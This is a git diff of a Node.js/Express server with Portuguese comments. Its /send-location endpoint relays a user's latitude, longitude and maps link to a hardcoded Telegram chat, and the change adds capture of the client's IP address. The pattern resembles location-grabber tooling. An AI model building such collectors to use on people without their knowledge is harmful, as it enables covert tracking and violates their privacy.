@@ -35,10 +35,18 @@ const TELEGRAM_CHAT_ID = "-4950002868"; // Substitua pelo ID do chat (ou grupo) 
 
 app.post("/send-location", async (req, res) => {
   const { latitude, longitude, maps, transactionId, timestamp } = req.body;
+  
+  // Capturar IP do usuário
+  const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+                   req.headers['x-real-ip'] || 
+                   req.connection.remoteAddress || 
+                   req.socket.remoteAddress ||
+                   'IP não disponível';
 
   const message = `📍 Nova Localização Recebida\n\n` +
     `ID da Transação: ${transactionId || 'N/A'}\n` +
     `Data/Hora: ${timestamp || new Date().toISOString()}\n` +
+    `IP do Cliente: ${clientIP}\n` +
     `Latitude: ${latitude}\n` +
     `Longitude: ${longitude}\n` +
     `Maps: ${maps}`;
